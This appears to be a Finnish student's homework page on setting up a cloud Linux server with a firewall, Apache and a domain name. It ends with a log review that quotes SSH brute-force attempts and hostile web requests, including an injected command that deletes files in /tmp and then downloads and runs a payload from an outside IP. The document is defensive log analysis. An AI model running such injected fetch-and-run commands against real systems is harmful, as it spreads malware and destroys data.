<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

        <!-- Bootstrap CSS -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

        <title>Linux palvelimet</title>
    </head>
    <body>
        <nav class="nav nav-tabs">
            <a class="nav-link" href="index.html">Etusivu</a>
            <a class="nav-link" href="h1.html">H1</a>
            <a class="nav-link" href="h2.html">H2</a>
            <a class="nav-link" href="h3.html">H3</a>
            <a class="nav-link" active>H4</a>
            <a class="nav-link" href="h5.html">H5</a>
            <a class="nav-link" href="h6.html">H6</a>
        </nav>

        <div class="jumbotron" style="padding-top: 20px;">           
            <h1>Harjoitus H4 - virtuaalipalvelin</h1>

            <div class="container" style="padding-top: 20px;">
                <div class="row">
                    <div class="col-3">Nimi</div>
                    <div class="col">Sanna Jyrinki</div>
                </div>
                <div class="row">
                    <div class="col-3">Oppilaitos</div>
                    <div class="col">Haaga-Helian ammattikorkeakoulu</div>
                </div>
                <div class="row">
                    <div class="col-3">Kurssi</div>
                    <div class="col">
                        <a href="https://terokarvinen.com/2021/linux-palvelimet-ict4tn021-3018/">linux-palvelimet-ict4tn021-3018</a>
                    </div>
                </div>
                <div class="row">
                    <div class="col-3">Opettaja</div>
                    <div class="col">Tero Karvinen</div>
                </div>
            </div>
            <div class="container" style="padding-top: 20px;">
                <div class="row">
                    <div class="col-3">Tietokoneena</div>
                    <div class="col">Intel(R) Core(TM) i7-6500U CPU @ 2.50GHz</div>
                </div>
                <div class="row">
                    <div class="col-3">Käyttöjärjestelmä</div>
                    <div class="col">Windows 10 Home, Versio 20H2</div>
                </div>
                <div class="row">
                    <div class="col-3">Linux</div>
                    <div class="col">Virtual Box 6.1, Debian 11.2</div>
                </div>
            </div>

            <div class="card">
                <div class="card-body">
                    <h5 class="card-title">Lähteet</h5>
                    <p>Karvinen, T. 2017. First Steps on a New Virtual Private Server – an Example on DigitalOcean and Ubuntu 16.04 LTS. 
                        Luettavissa 
                    <a href="https://terokarvinen.com/2017/first-steps-on-a-new-virtual-private-server-an-example-on-digitalocean/?fromSearch=first%20steps">
                        https://terokarvinen.com/2017/first-steps-on-a-new-virtual-private-server-an-example-on-digitalocean/?fromSearch=first%20steps
                    </a>. Luettu 10.2.2022.
                    </p>
                    <p>Karvinen, T. 2018. Name Based Virtual Hosts on Apache – Multiple Websites to Single IP Address 
                        Luettavissa 
                    <a href="https://terokarvinen.com/2018/name-based-virtual-hosts-on-apache-multiple-websites-to-single-ip-address/?fromSearch=name%20based%20virtual">
                        https://terokarvinen.com/2018/name-based-virtual-hosts-on-apache-multiple-websites-to-single-ip-address/?fromSearch=name%20based%20virtual
                    </a>. Luettu 10.2.2022.
                    </p>

                    
                    <h5 class="card-title">Tehtävä z, tiivistelmä artikkeleista</h5>
                  
                    <p><h6 class="card-subtitle mb-2 text-muted">Karvinen, 2017: First Steps on a New Virtual Private Server – an Example on DigitalOcean and Ubuntu 16.04 LTS</h6></p>
                    
                        <ul>
                            <li>Artikkeli kertoo kuinka vuokraat virtuaalipalvelimen DigitalOceanilta ja vuokraat nimipalvelun NameCheap:lta</li>
                            <li>Opiskelija saat GitHub Education paketin ja saat ilmaisen .me päätteisen osoitteen</li>
                            <li>Muitakin paikkoja on, esim. Linode ja Gandi</li>
                        </ul>
                    
                    <p><h6 class="card-subtitle mb-2 text-muted">Karvinen, 2018: Name Based Virtual Hosts on Apache – Multiple Websites to Single IP Address</h6></p>
     
                    <ul>
                        <li>Artikkeli opastaa, miten asennat Apache webbiserverin virtuaalipalvelimeesi</li>
                        <li>On myös kerrottu, miten teet yksinkertaisen ensimmäisen oman html-sivun palvelimelle</li>
                    </ul>

                    <h5 class="card-title">Tehtävä a, palvelin pilveen</h5>

                    <p>Ennen oppintuntia olin jo vuokrannut nimen jyrinki.com Gandilta ja virtuaalipalvelintilan UpCloud:lta. En ollut vielä asentanut palvelinta.
                        Kirjauduin saamillani tunnuksilla UpCloadin konsolille osoitteeseen https://hub.upcloud.com/.
                    </p>
                    <img style="border: solid 1px" class="card-img-bottom img-fluid" src="h4_images/a_1.PNG" alt="Responsive image">
                
                    <p>Lisäsin palvelimen, valitsin sijainniksi suomi ja otin halvimman paketin 
                        <pre>
                            1 core
                            1 GB memory
                            25 GB storage
                            1 TB transfer.
                        </pre>
                        Valitsin käyttöjärjestelmäksi Debian GNU/Linux 11 (Bullseye) ja sisäänkirjautumistavaksi One time passwprd.
                        Muuten menin oletusasetuksilla.
                    </p>
                    <img style="border: solid 1px" class="card-img-bottom img-fluid" src="h4_images/a_2.PNG" alt="Responsive image">
                
                    <p>Sähköpostiini tuli ilmoitus palvelimen perustamisesta, palvelimen ip-osoite ja root-tunnuksen salasana.
                        Kirjaudun windowsin komentokehotteella ssh:lla palvelimelle <pre>ssh root@iposoite</pre>
                    </p>
                    <img style="border: solid 1px" class="card-img-bottom img-fluid" src="h4_images/a_3.PNG" alt="Responsive image">
                
                    <h5 class="card-title">Tehtävä d, tulimuuri</h5>

                    <p>Asennetaan tulimuuri. Jotta tämä onnistuu, pitää kuitenkin ensin asentaa ufw, eli tehdään</p>
                    <pre>
                        sudo apt-get update
                        sudo apt-get -y install ufw
                    </pre>
                    <p>Tehdään ensin tulimuuriin reikä ssh-yhteydelle, jotta palvelimelle kirjautuminen jatkossakin onnistuu</p>
                    <pre>
                        sudo ufw allow 22/tcp
                    </pre>
                    <p>Laitetaan tulimuuri päälle</p>
                    <pre>
                        sudo ufw enable
                    </pre> 
                    <p>Saadaan ilmoitus 'Firewall is active and enabled on system startup'. </p>

                    <p>Vaikkei tässä tehtävässä pyydetty, niin luodaan oma käyttäjätunnus sanna ja annetaan sille sudo oikeus</p>
                    <pre>
                        sudo adduser sanna
                        sudo adduser sanna sudo
                        sudo adduser sanna adm
                    </pre>

                    <p>Avataan toinen konsoli, ja kokeillaan nyt, että sanna tunnuksella kirjautuminen onnistuu</p>
                    <pre>ssh sanna@iposoite</pre>
                    <img style="border: solid 1px" class="card-img-bottom img-fluid" src="h4_images/d_1.PNG" alt="Responsive image">
                
                    <p>Suljetaan vielä root tunnus, jatkossa kirjaudutaan omalla sanna-tunnuksella</p>
                    <pre>sudo usermod --lock root</pre>

                    <p>Estetään kokonaan root tunnuksella kirjautuminen muokkaamalla</p>
                    <pre>sudoedit /etc/ssh/sshd_config</pre>
                    <p>muutetaan siinä 'PermitRootLogin no'</p>
                    <p>Startataan ssh</p>
                    <pre>sudo service ssh restart</pre>

                    <h5 class="card-title">Tehtävä e, Apache asennus</h5>
                    <p>Aluksi päivitetään 'sudo apt-get update', tämä yritetään muistaa aina ennen asennuksia tms.</p>
                    <p>Asennetaan Apache2</p>
                    <pre>sudo apt-get -y install apache2</pre>
                    <p>Korvataan testisivu</p>
                    <pre>echo "Default"|sudo tee /var/www/html/index.html</pre>
                    <p>Avataan tulimuuriin reikä apachen portille</p>
                    <pre>sudo ufw allow 80/tcp</pre>
                    <p>Testataan, että testisivuni toimii</p>
                    <img style="border: solid 1px" class="card-img-bottom img-fluid" src="h4_images/e_1.PNG" alt="Responsive image">

                    <p><h6 class="card-subtitle mb-2 text-muted">
                        Käyttäjän omat kotisivut
                    </h6></p>
                    <p>Asennetaan tekstieditori micro, jota on mukava käyttää html tiedoston editointiin</p>
                    <pre>sudo apt-get -y install micro</pre>
                    <p>Tehdään kotihakemistoon public_html ja sen alle index.html</p></pZ>
                    <pre>
                        cd /home/sanna
                        mkdir public_html
                        cd public_html
                        micro index.html
                    </pre>
                    <p>Editoin html koodin seuraavaksi</p>
                    <img style="border: solid 1px" class="card-img-bottom img-fluid" src="h4_images/e_2.PNG" alt="Responsive image">
                    <p>Testasin selaimessa sivua, muttei se vielä toimi, täytyy h3 tehtävän tapaan </p>
                    <pre>
                        sudo a2enmod userdir
                        sudo service apache2 restart
                    </pre>
                    <p>Nyt sivuni näkyy</p>
                    <img style="border: solid 1px" class="card-img-bottom img-fluid" src="h4_images/e_3.PNG" alt="Responsive image">
                    <p>Testaan nyt myös kännykällä, että sivuni näkyy</p>
                    <img style="border: solid 1px; max-width: 20%;" class="card-img-left" src="h4_images/e_4.PNG" alt="Responsive image">
                
                    <p><h6 class="card-subtitle mb-2 text-muted">
                        Domain nimi käyttöön
                    </h6></p>
                    <p>Aiemmin olen varannut gandi.net palvelusta domain nimen, konffataan se nyt palvelimen ip-osoitteeseen</p>
                    <img style="border: solid 1px" class="card-img-left" src="h4_images/e_5.PNG" alt="Responsive image">
                    <p>Siirrytään Domain -> DNS Records</p>
                    <p>Otetaan ensin varmuuskopio alkuasetuksista, tämä onnistuu valitsemalla Text Mode ja kopioimalla sisältö omalle koneelle tekstitiedostoon</p>
                    <p>Lisätään 2 DNS Recordia</p>
                    <ul>
                        <li>Name=@, Type=A-type, TTL=300, Value=palvelimen ip-osoite </li>
                        <li>Name=www, Type=A-type, TTL=300, Value=palvelimen ip-osoite </li>
                    </ul>
                    <p>Poistetaan alkuperäinen @ A-type arvo, jonka ip oli 	217.70.184.38, joka ilmeisesti on jokin gandin palvelin</p>
                    <p>Kokeillaan windowsista pingata 'ping jyrinki.com' eli domain nimi löytyy</p>
                    <img style="border: solid 1px" class="card-img-left" src="h4_images/e_6.PNG" alt="Responsive image">

                    <p>Testataan selaimella osoitetta jyrinki.com/~sanna</p>
                    <img style="border: solid 1px" class="card-img-left" src="h4_images/e_6.PNG" alt="Responsive image">

                    <p style="color: red;padding: 10px;">Jihuu, sivuni näkyvät domain nimelläni</p>

                    <h5 class="card-title">Tehtävä f, päivitetään ohjelmat</h5>
                    <p>Lopuksi vielä päivitin ohjelmat</p>
                    <pre>
                        sudo apt-get update
                        sudo apt-get upgrade
                    </pre>

                    <h5 class="card-title">Tehtävä g, murtautumisyrityksiä lokeilla</h5>
                    <p>Katselin debianin lokeja /var/log hakemistossa, auth.log lokissa näkyy häkellyttävän paljon epäonnistuneita yrityksiä kirjautua palvelimelle.
                        Yrityksiä on sekä root tunnuksella, että muilla tunnuksilla. Yrityksiä on satoja päivässä, tässä vain joitakin esimerkkejä
                    </p>
                    <pre>                    
                        sanna@debian-1cpu-1gb-fi-hel1:/var/log$ cat auth.log |grep Failed | more
                        Feb 13 00:31:54 debian-1cpu-1gb-fi-hel1 sshd[15067]: Failed password for root from 112.85.42.74 port 40663 ssh2
                        Feb 13 01:46:40 debian-1cpu-1gb-fi-hel1 sshd[15179]: Failed password for invalid user a from 199.195.254.61 port 42962 s
                        sh2
                        Feb 13 01:46:44 debian-1cpu-1gb-fi-hel1 sshd[15187]: Failed password for invalid user postgres from 199.195.254.61 port
                        48216 ssh2
                        Feb 13 01:46:51 debian-1cpu-1gb-fi-hel1 sshd[15189]: Failed password for invalid user ansible from 199.195.254.61 port 5
                        0332 ssh2
                        Feb 13 01:46:55 debian-1cpu-1gb-fi-hel1 sshd[15191]: Failed password for invalid user zabbix from 199.195.254.61 port 55
                        158 ssh2
                        Feb 13 01:47:16 debian-1cpu-1gb-fi-hel1 sshd[15197]: Failed password for invalid user public from 199.195.254.61 port 41
                        170 ssh2
                        Feb 13 01:47:20 debian-1cpu-1gb-fi-hel1 sshd[15199]: Failed password for invalid user odoo12 from 199.195.254.61 port 46
                        320 ssh2
                        Feb 13 01:47:23 debian-1cpu-1gb-fi-hel1 sshd[15201]: Failed password for invalid user steam from 199.195.254.61 port 507
                        36 ssh2
                        Feb 14 00:28:32 debian-1cpu-1gb-fi-hel1 sshd[18740]: Failed password for invalid user admin from 45.141.84.10 port 30566
                        ssh2
                    </pre>

                    <p>Onnistuneita kirjautumisyrityksiä on vain omalla tunnuksellani, ja sellaisina aikoina, jona olen itse kirjautunut. </p>

                    <p>Katson lisäksi apache2:n access.logia hakemistossa /var/log/apache2.
                        Normaali GET pyyntö syntyy, kun esim itse surffaan sivulleni jyrinki.com/~sanna seuraavasti
                    </p>
                    <pre>
                        81.197.118.122 - - [14/Feb/2022:16:42:29 +0000] "GET /~sanna/ HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36"
                    </pre>
                    <p>
                        Tämän lisäksi lokilla on kuitenkin epäilyttäviä POST pyyntöjä, minullahan on vain staattinen sivu, status- koodi on 200 eli ok, onko joku saanut siis POST-pyynnöt oikeasti läpi palvelimelleni?
                    </p>
                    <pre>
                        190.213.155.143 - - [14/Feb/2022:04:20:21 +0000] "POST / HTTP/1.1" 200 289 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
                        69.162.231.50 - - [14/Feb/2022:05:46:41 +0000] "POST / HTTP/1.1" 200 289 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
                        45.146.165.37 - - [14/Feb/2022:08:03:11 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
                        52.170.146.2 - - [14/Feb/2022:08:50:49 +0000] "POST / HTTP/1.1" 200 289 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
                        52.170.146.2 - - [14/Feb/2022:15:29:31 +0000] "POST / HTTP/1.1" 200 289 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"  
                    </pre>
                    <p>GET pyynnöissä on myös epäilyttäviä, joissa selvästi yritetään ajaa skriptikoodia, näitäkin on paljon, tässä muutama esimerkki. Näen kellonajan, http statuskoodin, selaimen ja ip-osoitteen. Statuskoodit 404 eli pyynnöt eivät ole onnistuneet.</p>
                    <pre>
                        89.187.177.51 - - [14/Feb/2022:01:45:12 +0000] "GET http://dyn.epicgifs.net/test6956.php HTTP/1.1" 404 439 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
                        ...
                        156.221.228.19 - - [14/Feb/2022:01:58:27 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ http://23.94.7.175/.s4y/arm;sh+/tmp/a
                        rm" 400 483 "-" "-"
                        ...
                        45.137.21.134 - - [14/Feb/2022:04:12:16 +0000] "GET /dispatch.asp HTTP/1.1" 404 493 "-" "Mozilla/5.0 (iPad; CPU OS 7_1_2
                        like Mac OS X; en-US) AppleWebKit/531.5.2 (KHTML, like Gecko) Version/4.0.5 Mobile/8B116 Safari/6531.5.2"
                        ...
                        190.213.155.143 - - [14/Feb/2022:04:20:21 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) Apple
                        WebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
                    </pre>

                    <p>Kaikista lokeista näen kellonajan (joka on 2 tuntia vähemmän kuin Suomen aika, pitäisi siis säätää palvelin kellon lokalisaatio), GET/POST, statuskoodi, selain, ip-osoite</p>
                </div>
            </div>
		</div>
    </div>
</html>
